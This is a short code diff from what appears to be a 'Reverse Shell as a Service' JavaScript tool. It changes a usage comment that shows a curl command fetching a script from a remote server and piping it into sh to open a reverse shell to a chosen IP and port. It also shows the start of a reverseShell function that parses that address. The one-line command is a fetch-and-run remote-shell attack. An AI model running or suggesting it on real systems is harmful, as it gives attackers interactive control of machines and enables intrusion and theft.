@@ -1,7 +1,7 @@
 'use strict';
 
 const usage = `# Reverse Shell as a Service
-# curl https://shell.this-device.com//yourip:port | sh
+# curl https://shell.this-device.com/yourip:port | sh
 
 const reverseShell = (address = '') => {
 	const [host, port] = address.split(':');
